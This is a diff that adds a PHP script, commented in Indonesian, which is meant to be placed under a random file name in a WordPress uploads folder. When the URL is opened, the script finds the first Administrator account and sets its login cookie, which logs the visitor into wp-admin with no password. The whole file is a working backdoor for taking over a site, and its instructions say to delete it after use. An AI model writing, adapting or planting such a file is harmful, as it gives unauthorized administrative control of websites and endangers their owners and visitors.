@@ -1,0 +1,137 @@
+<?php
+/**
+ * WordPress Auto-Login as Administrator
+ * Langsung login sebagai admin tanpa password.
+ *
+ * Cara pakai:
+ *  1. Simpan file ini (misal: x7k2m.php) di dalam instalasi WordPress
+ *     (contoh: wp-content/uploads/x7k2m.php)
+ *  2. Buka URL-nya di browser
+ *  3. Anda akan langsung masuk /wp-admin/ sebagai Administrator
+ *  4. HAPUS file ini segera setelah digunakan
+ */
+
+session_start();
+
+// ======================================================
+// KONFIGURASI DEBUG (opsional)
+// Isi dengan path file jika ingin log, contoh:
+// $DEBUG_LOG = __DIR__ . '/debug.log';
+// Biarkan kosong untuk menonaktifkan log.
+// ======================================================
+$DEBUG_LOG = '';
+
+function dbg($msg) {
+    global $DEBUG_LOG;
+    if (empty($DEBUG_LOG)) return;
+    $t = date('Y-m-d H:i:s');
+    @file_put_contents($DEBUG_LOG, "[$t] $msg\n", FILE_APPEND | LOCK_EX);
+}
+
+dbg("=== Auto-login started ===");
+
+// ======================================================
+// CARI wp-load.php (naik ke parent folder, max 10 level)
+// ======================================================
+$mr = realpath(__DIR__);
+dbg("Start search wp-load from: $mr");
+$max = 10;
+$found = false;
+
+while ($max-- > 0 && $mr) {
+    if (file_exists($mr . '/wp-load.php')) {
+        $found = true;
+        dbg("Found wp-load at: $mr");
+        break;
+    }
+    $parent = dirname($mr);
+    if ($parent === $mr) break;
+    $mr = $parent;
+}
+
+// Fallback: cek DOCUMENT_ROOT
+if (!$found && !empty($_SERVER['DOCUMENT_ROOT'])) {
+    $docroot = realpath($_SERVER['DOCUMENT_ROOT']);
+    if ($docroot && file_exists($docroot . '/wp-load.php')) {
+        $mr = $docroot;
+        $found = true;
+        dbg("Found wp-load at DOCUMENT_ROOT: $mr");
+    }
+}
+
+if (!$found) {
+    dbg("Failed to find wp-load.php. Aborting.");
+    http_response_code(404);
+    exit('Failed to load wp-load.php');
+}
+
+// ======================================================
+// INCLUDE wp-load.php
+// ======================================================
+@chdir($mr);
+ob_start();
+$include_ok = @include_once $mr . '/wp-load.php';
+$wp_output = ob_get_clean();
+
+if ($wp_output !== '') {
+    dbg("wp-load.php produced output (len " . strlen($wp_output) . "): " . substr($wp_output, 0, 200));
+} else {
+    dbg("wp-load.php produced no direct output.");
+}
+
+if (!function_exists('wp_set_auth_cookie') || !class_exists('WP_User_Query')) {
+    dbg("WP functions not available after include. Aborting.");
+    exit('WP functions unavailable.');
+}
+
+// ======================================================
+// CARI USER ADMINISTRATOR & AUTO-LOGIN
+// ======================================================
+try {
+    $wp_user_query = new WP_User_Query([
+        'role'   => 'Administrator',
+        'number' => 1,
+        'fields' => 'ID',
+    ]);
+    $results = $wp_user_query->get_results();
+    dbg("WP_User_Query executed; results count: " . count($results));
+} catch (Throwable $e) {
+    dbg("Exception during WP_User_Query: " . $e->getMessage());
+    exit('Query error.');
+}
+
+if (!empty($results[0])) {
+    $user_id = (int)$results[0];
+    wp_set_auth_cookie($user_id);
+    dbg("wp_set_auth_cookie called for user_id={$user_id}");
+
+    $redirect_to = (function_exists('admin_url') ? admin_url() : '/wp-admin/');
+    dbg("Redirect target: $redirect_to");
+
+    if (!headers_sent($file, $line)) {
+        if (function_exists('wp_redirect')) {
+            wp_redirect($redirect_to);
+            dbg("Used wp_redirect()");
+        } else {
+            header("Location: $redirect_to", true, 302);
+            dbg("Used header('Location: ...')");
+        }
+        exit;
+    } else {
+        // Fallback JS jika header sudah terkirim
+        dbg("Headers already sent at $file:$line - doing JS fallback.");
+        echo "<!doctype html><html><head><meta charset='utf-8'><title>Redirecting...</title></head><body>";
+        echo "<p>Redirecting to admin...</p>";
+        echo "<script>window.location.replace(" . json_encode($redirect_to) . ");</script>";
+        echo "<noscript><a href=\"" . htmlspecialchars($redirect_to, ENT_QUOTES, 'UTF-8') . "\">Click here</a></noscript>";
+        echo "</body></html>";
+        exit;
+    }
+} else {
+    dbg("No admin user found.");
+    http_response_code(500);
+    exit('NO ADMIN');
+}
+
+
+
